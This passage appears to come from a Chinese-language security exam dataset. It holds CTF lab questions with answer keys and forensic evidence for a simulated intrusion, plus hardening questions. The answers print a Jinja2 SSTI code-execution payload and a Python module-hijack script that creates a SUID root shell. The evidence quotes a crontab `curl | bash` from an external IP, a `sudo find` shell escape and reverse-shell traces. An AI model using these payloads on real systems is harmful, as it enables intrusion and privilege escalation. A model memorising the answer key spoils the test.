      "question": "根據【證據 J】，8080 端口上的 `/greet` 路由存在何種漏洞？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 J：Web 8080 內部 API 後台原始碼節錄 (app.py)】"
      ],
      "answer": "伺服器端模板注入漏洞（SSTI，Server-Side Template Injection）",
      "clean_answer": "伺服器端模板注入漏洞（SSTI，Server-Side Template Injection）",
      "basis": "【證據 J】代碼使用 `f\"<h3>Hello, {name}!...</h3>\"` 進行字串格式化拼接後，直接傳入 `render_template_string()`，造成標準 Jinja2 SSTI。",
      "full_solution": "- **官方標準答案**：伺服器端模板注入漏洞（SSTI，Server-Side Template Injection）\n\n- **解析依據**：【證據 J】代碼使用 `f\"<h3>Hello, {name}!...</h3>\"` 進行字串格式化拼接後，直接傳入 `render_template_string()`，造成標準 Jinja2 SSTI。"
    },
    {
      "id": 86,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "承上題，攻擊者欲利用該漏洞驗證代碼執行能力，請寫出透過注入 Python 內建子類別執行系統指令（如 `id`）的標準 SSTI 利用表達式。  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` (或利用 `lipsum`、`cycler` 等內建對象)",
      "clean_answer": "name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` (或利用 `lipsum`、`cycler` 等內建對象)",
      "basis": "Jinja2 中透過當前物件存取全域環境中的 `os.popen()` 執行系統指令並讀取輸出。",
      "full_solution": "- **官方標準答案**：`name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` (或利用 `lipsum`、`cycler` 等內建對象)\n\n- **解析依據**：Jinja2 中透過當前物件存取全域環境中的 `os.popen()` 執行系統指令並讀取輸出。"
    },
    {
      "id": 87,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "攻擊者利用 SSTI 成功在目標靶機上建立反彈 Shell，連回攻擊機監聽端口。請問通常應使用哪一個 Linux 指令在本地終端升級為完整 PTY 互動式 TTY Shell（支援自動補全與 Ctrl+C）？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` 配合 `Ctrl+Z`、`stty raw -echo; fg`",
      "clean_answer": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` 配合 `Ctrl+Z`、`stty raw -echo; fg",
      "basis": "利用 Python `pty.spawn` 升級為完整終端機 TTY 的標準黑客操作。",
      "full_solution": "- **官方標準答案**：`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` 配合 `Ctrl+Z`、`stty raw -echo; fg`\n\n- **解析依據**：利用 Python `pty.spawn` 升級為完整終端機 TTY 的標準黑客操作。"
    },
    {
      "id": 88,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "根據【證據 K】，使用者 `developer` 在執行 `sudo -l` 時被授與了何種特權？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 K：本機權限清查與 sudo -l 輸出 (一般使用者 www-data / developer)】"
      ],
      "answer": "允許以 `root` 身分無密碼執行 `/usr/bin/python3 /opt/maintenance/cleanup.py`",
      "clean_answer": "允許以 `root` 身分無密碼執行 `/usr/bin/python3 /opt/maintenance/cleanup.py",
      "basis": "【證據 K】`sudo -l` 標明：`(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance/cleanup.py`。",
      "full_solution": "- **官方標準答案**：允許以 `root` 身分無密碼執行 `/usr/bin/python3 /opt/maintenance/cleanup.py`\n\n- **解析依據**：【證據 K】`sudo -l` 標明：`(ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance/cleanup.py`。"
    },
    {
      "id": 89,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "根據【證據 K】，`/opt/maintenance/cleanup.py` 腳本引入了 `import helper`，且目錄 `/opt/maintenance/` 對 `developer` 為可寫。攻擊者應採取何種提權手法以 root 身分執行任意指令？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 K：本機權限清查與 sudo -l 輸出 (一般使用者 www-data / developer)】"
      ],
      "answer": "Python 模組劫持提權（Python Module Hijacking / Privilege Escalation）",
      "clean_answer": "Python 模組劫持提權（Python Module Hijacking / Privilege Escalation）",
      "basis": "Python 載入模組時，預設優先搜尋當前工作目錄或主腳本所在目錄。由於 `/opt/maintenance/` 對 `developer` 群組可寫，攻擊者在該目錄下建立自定義的 `helper.py`，當 root 執行 `sudo python3 cleanup.py` 時，會優先載入攻擊者的 `helper.py`，從而以 root 權限執行任意代碼。",
      "full_solution": "- **官方標準答案**：Python 模組劫持提權（Python Module Hijacking / Privilege Escalation）\n\n- **解析依據**：Python 載入模組時，預設優先搜尋當前工作目錄或主腳本所在目錄。由於 `/opt/maintenance/` 對 `developer` 群組可寫，攻擊者在該目錄下建立自定義的 `helper.py`，當 root 執行 `sudo python3 cleanup.py` 時，會優先載入攻擊者的 `helper.py`，從而以 root 權限執行任意代碼。"
    },
    {
      "id": 90,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "請寫出在 `/opt/maintenance/` 目錄下建立惡意 `helper.py` 的具體 Python 代碼內容，使其在被 sudo 執行時自動產出一個 root shell 或將 `/bin/bash` 複製並賦予 SUID。  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "```python\n\n# /opt/maintenance/helper.py\n\nimport os\n\n\n\n\n\ndef clean_temp():\n\n  os.system(\n\n      \"cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\"\n\n  )  # 賦予 SUID\n\n```\n\n隨後執行 `sudo /usr/bin/python3 /opt/maintenance/cleanup.py`，再執行 `/tmp/rootbash -p` 即可獲取 root shell。",
      "clean_answer": "python\n\n# /opt/maintenance/helper.py\n\nimport os\n\n\n\n\n\ndef clean_temp():\n\n  os.system(\n\n      \"cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\"\n\n  )  # 賦予 SUID\n\n```\n\n隨後執行 `sudo /usr/bin/python3 /opt/maintenance/cleanup.py`，再執行 `/tmp/rootbash -p` 即可獲取 root shell。",
      "basis": "實現 `clean_temp()` 函數滿足原腳本調用，並在內部注入提權指令。",
      "full_solution": "- **官方標準答案**：\n\n```python\n\n# /opt/maintenance/helper.py\n\nimport os\n\n\n\n\n\ndef clean_temp():\n\n  os.system(\n\n      \"cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\"\n\n  )  # 賦予 SUID\n\n```\n\n隨後執行 `sudo /usr/bin/python3 /opt/maintenance/cleanup.py`，再執行 `/tmp/rootbash -p` 即可獲取 root shell。\n\n- **解析依據**：實現 `clean_temp()` 函數滿足原腳本調用，並在內部注入提權指令。"
    },
    {
      "id": 91,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "提權至 root 身分後，根目錄下存在檔案 `/root/root_flag.txt`，執行 `cat /root/root_flag.txt` 回顯：`flag{pwn_r00t_pr1v_3sc_c0mpl3t3}`。請記錄此 Flag。  \n\n  【作答區（Flag）】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "`flag{pwn_r00t_pr1v_3sc_c0mpl3t3}`",
      "clean_answer": "flag{pwn_r00t_pr1v_3sc_c0mpl3t3}",
      "basis": "實體題幹給定之最終提權 Flag。",
      "full_solution": "- **官方標準答案**：`flag{pwn_r00t_pr1v_3sc_c0mpl3t3}`\n\n- **解析依據**：實體題幹給定之最終提權 Flag。"
    },
    {
      "id": 92,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "為維持 root 權限的持久化（Persistence），攻擊者在 `/root/.ssh/authorized_keys` 中追加了自身的公鑰。管理員在檢查時應比對哪一個系統設定以確保只有合法金鑰能存取？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【情境背景說明】"
      ],
      "answer": "檢查 `/etc/ssh/sshd_config` 中的 `PermitRootLogin` 設定，並校驗 `/root/.ssh/authorized_keys` 中每一條公鑰的擁有者身分與雜湊指紋。",
      "clean_answer": "檢查 `/etc/ssh/sshd_config` 中的 `PermitRootLogin` 設定，並校驗 `/root/.ssh/authorized_keys` 中每一條公鑰的擁有者身分與雜湊指紋。",
      "basis": "防止未授權公鑰遺留形成隱蔽後門。",
      "full_solution": "- **官方標準答案**：檢查 `/etc/ssh/sshd_config` 中的 `PermitRootLogin` 設定，並校驗 `/root/.ssh/authorized_keys` 中每一條公鑰的擁有者身分與雜湊指紋。\n\n- **解析依據**：防止未授權公鑰遺留形成隱蔽後門。"
    },
    {
      "id": 93,
      "exam": "exam_b",
      "domain": "第四部分：CTF II 實戰靶機渗透與權限提升演練",
      "category": "實戰靶機渗透與提權",
      "type": "lab_question",
      "question": "若要加固【證據 K】中的提權弱點，管理員應對 `/opt/maintenance/` 目錄與 `sudoers` 分別執行何種權限修復？  \n\n  【作答區】：____________________",
      "related_evidence": [
        "【證據 K：本機權限清查與 sudo -l 輸出 (一般使用者 www-data / developer)】"
      ],
      "answer": "1. 目錄權限修復：將 `/opt/maintenance/` 目錄權限收回，設為僅 root 可寫（`chown root:root /opt/maintenance && chmod 755 /opt/maintenance`）；\n\n  2. sudoers 修復：從 `/etc/sudoers` 中移除該行無密碼授權，或指定完整的安全環境與固定腳本 Hash。",
      "clean_answer": "1. 目錄權限修復：將 `/opt/maintenance/` 目錄權限收回，設為僅 root 可寫（`chown root:root /opt/maintenance && chmod 755 /opt/maintenance`）；\n\n  2. sudoers 修復：從 `/etc/sudoers` 中移除該行無密碼授權，或指定完整的安全環境與固定腳本 Hash。",
      "basis": "消除模組目錄可寫與 sudo 過度放權的根源配置弱點。",
      "full_solution": "- **官方標準答案**：\n\n  1. 目錄權限修復：將 `/opt/maintenance/` 目錄權限收回，設為僅 root 可寫（`chown root:root /opt/maintenance && chmod 755 /opt/maintenance`）；\n\n  2. sudoers 修復：從 `/etc/sudoers` 中移除該行無密碼授權，或指定完整的安全環境與固定腳本 Hash。\n\n- **解析依據**：消除模組目錄可寫與 sudo 過度放權的根源配置弱點。"
    }
  ],
  "evidences": [
    {
      "part": 1,
      "title": "【情境背景說明】",
      "raw_title": "情境背景說明",
      "content": "某半導體企業的內網核心伺服器（主機名：`SEC-SRV01`，IP：`192.168.50.10`，作業系統：Windows Server 2019 / Linux Web 混編架構）於凌晨遭到 APT 組織滲透。SOC 監控中心發現異常出網連線與高額 CPU 佔用，資安工程師第一時間完成了記憶體轉儲（`memory.dmp`）並封裝了系統安全事件日誌（`Security.evtx`）與 Linux 系統日誌。請隊員根據下列鑑識取證資料回答問題。"
    },
    {
      "part": 1,
      "title": "【證據 A：Volatility 3 記憶體處理序分析 (windows.pslist 輸出摘錄)】",
      "raw_title": "證據 A：Volatility 3 記憶體處理序分析 (windows.pslist 輸出摘錄)",
      "content": "```text\n\nPID     PPID    ImageFileName       Offset(V)           Threads   Handles  CreateTime\n\n4       0       System              0xfa800184b040      98        -        2026-07-28 01:10:02\n\n368     4       smss.exe            0xfa8001c22940      3         29       2026-07-28 01:10:03\n\n492     484     csrss.exe           0xfa8001d93060      9         412      2026-07-28 01:10:05\n\n540     484     wininit.exe         0xfa8001e14700      3         78       2026-07-28 01:10:06\n\n612     540     services.exe        0xfa8001e7a060      7         234      2026-07-28 01:10:07\n\n624     540     lsass.exe           0xfa8001e85060      6         952      2026-07-28 01:10:07\n\n924     612     svchost.exe         0xfa8002130060      18        310      2026-07-28 01:10:12\n\n1420    612     spoolsv.exe         0xfa80022fa060      4         115      2026-07-28 01:10:18\n\n2048    924     powershell.exe      0xfa80028a4900      8         189      2026-07-28 02:45:11\n\n3124    2048    cmd.exe             0xfa80029b7060      1         32       2026-07-28 02:46:02\n\n3892    3124    nc.exe              0xfa8002ab1800      1         19       2026-07-28 02:46:15\n\n4100    612     svch0st.exe         0xfa8002bc9200      2         45       2026-07-28 02:50:33\n\n```"
    },
    {
      "part": 1,
      "title": "【證據 B：Volatility 3 網路活動分析 (windows.netscan 輸出摘錄)】",
      "raw_title": "證據 B：Volatility 3 網路活動分析 (windows.netscan 輸出摘錄)",
      "content": "```text\n\nOffset          Proto  LocalAddr           LocalPort  ForeignAddr         ForeignPort  State        PID   Owner\n\n0xfa8002120010  TCPv4  0.0.0.0             80         0.0.0.0             0            LISTENING    4     System\n\n0xfa8002128010  TCPv4  0.0.0.0             445        0.0.0.0             0            LISTENING    4     System\n\n0xfa8002131010  TCPv4  0.0.0.0             3389       0.0.0.0             0            LISTENING    924   svchost.exe\n\n0xfa80028f9010  TCPv4  192.168.50.10       49211      103.20.114.89       4444         ESTABLISHED  3892  nc.exe\n\n0xfa8002bca010  TCPv4  192.168.50.10       49302      185.220.101.5       8080         ESTABLISHED  4100  svch0st.exe\n\n```"
    },
    {
      "part": 1,
      "title": "【證據 C：Windows 安全日誌 (Security.evtx 事件摘錄)】",
      "raw_title": "證據 C：Windows 安全日誌 (Security.evtx 事件摘錄)",
      "content": "- **事件記錄 1**：  \n\n  `Event ID: 4625 (登入失敗)`  \n\n  `Time: 2026-07-28 02:15:22`  \n\n  `Account Name: Administrator`  \n\n  `Source Network Address: 192.168.50.250`  \n\n  `Logon Type: 3`  \n\n  `Failure Reason: Unknown user name or bad password (0xC000006A)`  \n\n  *(備註：該日誌在 02:15:00 ~ 02:28:40 區間內連續出現 1,420 次)*\n\n- **事件記錄 2**：  \n\n  `Event ID: 4624 (登入成功)`  \n\n  `Time: 2026-07-28 02:28:45`  \n\n  `Target Account: svc_backup`  \n\n  `Source Network Address: 192.168.50.250`  \n\n  `Logon Type: 3`  \n\n  `Authentication Package: NTLM`  \n\n- **事件記錄 3**：  \n\n  `Event ID: 7045 (新服務安裝)`  \n\n  `Time: 2026-07-28 02:50:30`  \n\n  `Service Name: WindowsUpdateAssist`  \n\n  `Service File Name: C:\\Users\\Public\\svch0st.exe -k netsvcs`  \n\n  `Service Type: user mode service`  \n\n  `Service Start Type: auto start`  \n\n- **事件記錄 4**：  \n\n  `Event ID: 4688 (新處理序建立)`  \n\n  `Time: 2026-07-28 02:45:11`  \n\n  `New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`  \n\n  `Process Command Line: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...`  \n\n  `Creator Process Name: C:\\Windows\\System32\\svchost.exe (PID: 924)`"
    },
    {
      "part": 1,
      "title": "【證據 D：Linux 主機日誌與檔案節錄】",
      "raw_title": "證據 D：Linux 主機日誌與檔案節錄",
      "content": "- `/var/log/auth.log` 節錄：  \n\n  `Jul 28 03:02:11 web-app sshd[18492]: Accepted publickey for deployer from 192.168.50.250 port 52140 ssh2: RSA SHA256:abc...`  \n\n  `Jul 28 03:05:01 web-app sudo: deployer : TTY=pts/0 ; PWD=/home/deployer ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh \\;`  \n\n- `/etc/crontab` 節錄：  \n\n  `*/10 * * * * root curl -fsSL http://103.20.114.89/check.sh | bash`"
    },
    {
      "part": 1,
      "title": "【實戰鑑識問題 1 ~ 23】",
      "raw_title": "實戰鑑識問題 1 ~ 23",
      "content": "- **第 1 題**：根據【證據 A】，攻擊者所開啟之反向互動 Shell 網路工具 `nc.exe`，其進程 PID 為何？  \n\n  【作答區】：____________________\n\n- **第 2 題**：根據【證據 A】，`nc.exe` 的父進程（PPID）對應哪一個映像檔名？該父進程的 PID 為何？  \n\n  【作答區】：映像檔名：____________，PID：____________\n\n- **第 3 題**：根據【證據 A】，列表中哪一個進程屬於明顯偽裝合法系統進程的惡意排程/木馬進程（拼寫偽裝）？  \n\n  【作答區】：____________________\n\n- **第 4 題**：根據【證據 B】，攻擊者接收 `nc.exe` 反彈 Shell 的外部 C2 伺服器 IP 位址與監聽端口為何？  \n\n  【作答區】：外部 IP：____________，端口：____________\n\n- **第 5 題**：根據【證據 B】，惡意偽裝進程 `svch0st.exe` 正向哪一個外部 IP 及端口維持連線？  \n\n  【作答區】：外部 IP：____________，端口：____________\n\n- **第 6 題**：根據【證據 C 事件記錄 1】，攻擊者最初發動的攻擊類型為何？發起源 IP 位址為何？  \n\n  【作答區】：攻擊類型：____________，發起源 IP：____________\n\n- **第 7 題**：承上題，被暴力破解的目標帳號名稱為何？狀態代碼 `0xC000006A` 代表何種錯誤？  \n\n  【作答區】：目標帳號：____________，代碼意義：____________\n\n- **第 8 題**：根據【證據 C 事件記錄 2】，攻擊者在暴力破解失敗後，成功透過哪一個受害帳號登入系統？登入類型（Logon Type）為何？  \n\n  【作答區】：成功帳號：____________，Logon Type：____________\n\n- **第 9 題**：根據【證據 C 事件記錄 3】，攻擊者在受害伺服器上建立的持久化服務名稱為何？該服務所指派的執行檔實體路徑為何？  \n\n  【作答區】：服務名稱：____________，實體路徑：____________\n\n- **第 10 題**：根據【證據 C 事件記錄 4】，攻擊者透過 PowerShell 執行的命令列參數包含 `-enc`，此參數代表後方字串採用何種編碼？  \n\n  【作答區】：____________________\n\n- **第 11 題**：若要將 Base64 編碼的 PowerShell 命令解碼，PowerShell 內部預設採用的字元編碼標準（Encoding）為何（UTF-8、ASCII 或 Unicode/UTF-16LE）？  \n\n  【作答區】：____________________\n\n- **第 12 題**：根據【證據 D】，攻擊者登入 Linux 主機所使用的系統帳號名稱為何？登入方式是密碼認證還是公鑰認證？  \n\n  【作答區】：帳號：____________，認證方式：____________\n\n- **第 13 題**：根據【證據 D】，攻擊者在 Linux 上使用 `sudo` 執行了哪一個指令實現無密碼本機提權？提權利用了該指令的哪一個參數？  \n\n  【作答區】：提權指令：____________，參數：____________\n\n- **第 14 題**：根據【證據 D】，攻擊者在 `/etc/crontab` 中寫入的後門任務執行頻率為何？下載執行之惡意腳本 URL 為何？  \n\n  【作答區】：執行頻率：____________，惡意 URL：____________\n\n- **第 15 題**：在 Volatility 3 中，若要將 PID 4100 的進程記憶體完整轉儲至本機目錄分析，應執行哪一條命令？  \n\n  【作答區】：____________________\n\n- **第 16 題**：在 Volatility 3 中，若要提取 Windows SAM 資料庫中的本地使用者 NTLM Hash，應使用哪一個插件？  \n\n  【作答區】：____________________\n\n- **第 17 題**：在 Linux 環境中，若要徹底清除攻擊者在 `/etc/crontab` 中留下的定時任務，最合適的處置指令與編輯流程為何？  \n\n  【作答區】：____________________\n\n- **第 18 題**：在 Windows 事件日誌中，Logon Type 3 代表何種登入方式？（如本機互動、網路連線、遠端桌面）  \n\n  【作答區】：____________________\n\n- **第 19 題**：在防守方事件應變流程（NIST SP 800-61）中，資安人員在確認 C2 連線後，第一時間拔除受害主機網線或切斷虛擬機 vNIC，此動作屬於六階段中的哪一個階段？  \n\n  【作答區】：____________________\n\n- **第 20 題**：若攻擊者在受害伺服器上刪除了 `svch0st.exe` 檔案，鑑識人員在 `C:\\Windows\\Prefetch` 目錄中找到名為 `SVCH0ST.EXE-XXXXXXXX.pf` 的檔案，該檔案能否證明該程式曾被執行過？（是/否）  \n\n  【作答區】：____________________\n\n- **第 21 題**：在對受害主機進行硬碟取證鏡像時，為了防止作業系統開機時主動寫入快取，必須在硬碟與採證主機之間串接何種硬體設備？  \n\n  【作答區】：____________________\n\n- **第 22 題**：計算取證鏡像完整性時，業界標準規定至少計算哪兩種密碼學雜湊值以確保法庭證據不可否認性？  \n\n  【作答區】：____________________\n\n- **第 23 題**：根據全案證據鏈，請簡要按時間先後排序攻擊者的五個入侵步驟：  \n\n  (1) 安裝 Windows 惡意服務持久化；(2) 透過 SSH 橫向移動至 Linux 並利用 sudo find 提權；(3) 對 Windows 進行 SMB 密碼爆破並登入；(4) 反彈 NC Shell；(5) 建立 Crontab 惡意排程。  \n\n  【作答區】：正確入侵時間順序：（填寫數字序號）____________________"
    },
    {
      "part": 2,
      "title": "【情境背景說明】",
      "raw_title": "情境背景說明",
      "content": "為防止受害系統再度被攻破，防守方團隊必須針對 Linux Web 伺服器與 Windows Server 進行全面安全加固。請針對下列加固項目與安全弱點，給出合規配置指令、檔案路徑或參數設定。"
    },
    {
      "part": 2,
      "title": "【Linux 安全加固篇 (第 24 ~ 38 題)】",
      "raw_title": "Linux 安全加固篇 (第 24 ~ 38 題)",
      "content": "- **第 24 題**：OpenSSH 加固：欲徹底停用 root 遠端登入，應在 `/etc/ssh/sshd_config` 中將哪一個參數修改為何值？  \n\n  【作答區】：參數：____________________，值：____________________\n\n- **第 25 題**：OpenSSH 加固：欲停用密碼認證並僅允許公鑰登入，應修改哪一個參數為何值？  \n\n  【作答區】：參數：____________________，值：____________________\n\n- **第 26 題**：OpenSSH 加固：設定連線空閒逾時自動斷開（例如每 60 秒發送一次心跳，連續 3 次無回應即斷線），應配置哪兩個參數？  \n\n  【作答區】：____________________\n\n- **第 27 題**：帳號密碼策略：在 `/etc/login.defs` 中，欲設定密碼最長使用期限為 90 天，應修改哪一個設定項？  \n\n  【作答區】：____________________\n\n- **第 28 題**：密碼複雜度加固：在 `/etc/security/pwquality.conf` 中，欲要求密碼最短長度為 12 個字元，且至少包含大小寫英文字母、數字與特殊符號，應設定哪些關鍵參數？  \n\n  【作答區】：____________________\n\n- **第 29 題**：防暴力破解：在 Ubuntu/Debian 中配置 PAM 登入失敗處理模組，若設定連續輸錯 5 次鎖定 15 分鐘，應在 PAM 設定檔中追加何種模組配置語法？  \n\n  【作答區】：____________________\n\n- **第 30 題**：特殊權限清理：資安稽核要求清查系統中所有具備 SUID 特殊權限的檔案，請寫出使用 `find` 命令搜尋根目錄下所有 SUID 檔案的完整命令。  \n\n  【作答區】：____________________\n\n- **第 31 題**：檔案系統權限加固：針對系統關鍵密碼影子檔案 `/etc/shadow`，合規的權限數值（Octal）與擁有人/群組應為何？  \n\n  【作答區】：權限：____________，Owner/Group：____________\n\n- **第 32 題**：核心安全加固：在 `/etc/sysctl.conf` 中，欲禁止系統響應 ICMP 廣播請求以防範 Smurf 放大攻擊，應設定哪一條核心參數？  \n\n  【作答區】：____________________\n\n- **第 33 題**：核心安全加固：欲停用 IP 路由轉發功能（防止主機被當作跳板路由），應在 `sysctl.conf` 中設定哪一條參數？  \n\n  【作答區】：____________________\n\n- **第 34 題**：防火牆加固：使用 UFW（Uncomplicated Firewall）設定預設拒絕所有入站連線、允許所有出站連線，應執行哪兩條指令？  \n\n  【作答區】：____________________\n\n- **第 35 題**：防火牆加固：在 `iptables` 中設定允許已建立連線（ESTABLISHED, RELATED）的封包通過，以維持正常連線狀態，應寫入哪條規則？  \n\n  【作答區】：____________________\n\n- **第 36 題**：Sudo 特權管理：在 `/etc/sudoers` 中，下列配置存在嚴重提權隱患：`deployer ALL=(ALL) NOPASSWD: /usr/bin/find`。請寫出修改後的安全限制方式，或說明為何不應授與 `find` 無密碼執行權。  \n\n  【作答區】：____________________\n\n- **第 37 題**：日誌防護加固：欲防止重要日誌 `/var/log/secure` 被包含 root 在內的任何使用者刪除或覆寫（僅允許追加寫入），應使用 Linux 哪一個檔案屬性控制指令及參數？  \n\n  【作答區】：____________________\n\n- **第 38 題**：歷史命令記錄加固：為使 bash 歷史紀錄能包含執行時間戳以便鑑識溯源，應在 `/etc/profile` 中導出哪一個環境變數？  \n\n  【作答區】：____________________"
    },
    {
      "part": 2,
      "title": "【Windows 安全加固篇 (第 39 ~ 51 題)】",
      "raw_title": "Windows 安全加固篇 (第 39 ~ 51 題)",
      "content": "- **第 39 題**：帳戶鎖定策略：在本機安全性原則（secpol.msc）中，欲設定「連續登入失敗 5 次後鎖定帳戶 30 分鐘」，需設定哪兩個關鍵原則項目？  \n\n  【作答區】：____________________\n\n- **第 40 題**：密碼歷程原則：為防止使用者在密碼過期時重複改回原本的舊密碼，應啟用哪一項密碼原則並至少設定記住幾次舊密碼？  \n\n  【作答區】：____________________\n\n- **第 41 題**：協定加固：欲在 Windows Server 2016/2019 中徹底停用高風險且易受永恆之藍攻擊的 SMBv1 協定，應執行的 PowerShell 指令為何？  \n\n  【作答區】：____________________\n\n- **第 42 題**：網路共享加固：Windows 預設會開啟管理共用（如 `C$`, `ADMIN$`），若要透過登錄檔（Registry）全域關閉伺服器版 Windows 的預設管理共用，應在 `HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters` 新增哪一個 DWORD 值？其數值應設為何？  \n\n  【作答區】：機碼名稱：____________，數值：____________\n\n- **第 43 題**：遠端桌面 RDP 加固：欲強制 RDP 連線必須使用「網路層級驗證」（Network Level Authentication, NLA），此設定主要防止何種攻擊？  \n\n  【作答區】：____________________\n\n- **第 44 題**：安全稽核原則：為完整監控攻擊者在 Windows 上的活動，在進階稽核原則中，必須將哪兩項核心事件設定為「成功與失敗均記錄」？  \n\n  【作答區】：____________________\n\n- **第 45 題**：進程建立稽核：為了在 Event ID 4688 中能夠記錄到完整的進程命令列參數（如 PowerShell 執行的具體參數），必須啟用群組原則中的哪一項設定？  \n\n  【作答區】：____________________\n\n- **第 46 題**：本機系統帳號加固：在 Windows 安裝完成後，針對預設內建的 `Guest`（來賓帳戶）與 `Administrator`，最佳加固處置措施分別為何？  \n\n  【作答區】：____________________\n\n- **第 47 題**：記憶體保護加固：欲在 Windows 10/Server 2019 上啟用 DEP（資料執行防止）並保護所有進程，應在管理員命令提示字元執行哪一條 `bcdedit` 指令？  \n\n  【作答區】：____________________\n\n- **第 48 題**：本機認證安全加固：為防禦 Pass-the-Hash 攻擊並禁止快取 LM 與 NTLMv1 雜湊，應在安全性選項中將「網路安全性: LAN Manager 驗證層級」設定為哪一個合規等級？  \n\n  【作答區】：____________________\n\n- **第 49 題**：WinRM 安全加固：若企業使用 Windows 遠端管理（WinRM），應強制要求連線走 HTTPS（端口 5986）並停用哪一種不安全的認證協議？  \n\n  【作答區】：____________________\n\n- **第 50 題**：Windows 防火牆設定：欲透過 `netsh` 或 PowerShell 指令建立規則，封鎖所有入站的 TCP 445（SMB）端口連線，應寫出何種指令？  \n\n  【作答區】：____________________\n\n- **第 51 題**：系統更新加固：針對重要關鍵伺服器，安全基準規範中對於微軟每個月例行安全性更新（Patch Tuesday）的修補評估與驗證測試週期建議最長不應超過多少天？  \n\n  【作答區】：____________________"
    },
    {
      "part": 3,
      "title": "【情境背景說明】",
      "raw_title": "情境背景說明",
      "content": "鑑識團隊從企業周界防火牆抓取了兩份關鍵封包：\n\n1. `Topic1.pcap`：監控到內部主機 `192.168.10.5` 正在向外部 DNS 伺服器發送大量異常的高頻子域名查詢。\n\n2. `traffic.pcap`：外部黑客正對內網 Web 靶機發動多階段注入滲透與檔案上傳。  \n\n考生無須自行解析封包，關鍵協議流量、DNS 序列與 HTTP 請求內容已完整轉錄如下。"
    },
    {
      "part": 3,
      "title": "【證據 E：Topic1.pcap 之 DNS 異常查詢序列節錄】",
      "raw_title": "證據 E：Topic1.pcap 之 DNS 異常查詢序列節錄",
      "content": "內部主機向 DNS 伺服器發起之標準查詢請求（A 記錄）：\n\n```text\n\n查詢序號  時間戳             查詢類型  查詢子網域名稱 (Query Name)\n\n#0001    02:14:01.102       A        s000.NVYWK4ROEB2GQZJAM5SW23DF.tunnel.exfil.org\n\n#0002    02:14:01.215       A        s001.MVSCA43FNRXWO2LOEB2GQZJA.tunnel.exfil.org\n\n#0003    02:14:01.320       A        s002.MZXXE33OEBRG64RAKNEU423I.tunnel.exfil.org\n\n#0004    02:14:01.442       A        s003.JBEUYTCYKNKVGVKFKNKVGVKE.tunnel.exfil.org\n\n#0005    02:14:01.558       A        s004.J5HVORKFKNKE6V2KKVKVGS2F.tunnel.exfil.org\n\n...\n\n#0060    02:14:07.882       A        s059.MNUWO2LUEBTGS43IMVZGQ2LMN5.tunnel.exfil.org\n\n#0061    02:14:07.994       A        s060.UWW43VNNSSA5DVEB2GQZJAM5SW.tunnel.exfil.org\n\n#0062    02:14:08.105       A        s061.23DFEB2GQZJA.tunnel.exfil.org\n\n```"
    },
    {
      "part": 3,
      "title": "【證據 F：DNS 載荷還原與外洩客戶資料庫 (CSV 片段)】",
      "raw_title": "證據 F：DNS 載荷還原與外洩客戶資料庫 (CSV 片段)",
      "content": "將上述 `s000` 到 `s061` 之子域名去除序號並依序拼接後，進行特定編碼解密，成功還原出攻擊者竊取之外洩 CSV 檔案：\n\n```text\n\n[檔案名稱]: customers_export.csv\n\n[表頭結構]: id,name,credit_card,phone,email\n\n[資料行前 10 筆與最後筆摘錄]:\n\nid,name,credit_card,phone,email\n\n1,Samuel Edwards,4532-7890-1234-5678,555-0192,samuel@example.com\n\n2,Katherine Moore,5412-3456-7890-1234,555-0193,katherine@example.com\n\n3,Ian Lewis,3782-8224-6310-0051,555-0194,ian@example.com\n\n4,Lucas Hall,4024-0071-3321-9988,555-0195,lucas@example.com\n\n5,Liam Allen,6011-0012-3456-7890,555-0196,liam@example.com\n\n6,5teven Young,4556-1122-3344-5566,555-0197,steven@example.com\n\n7,4ndrew King,5200-8877-6655-4433,555-0198,andrew@example.com\n\n8,{ictor Wright,3528-0011-2233-4455,555-0199,victor@example.com\n\n9,Sophia 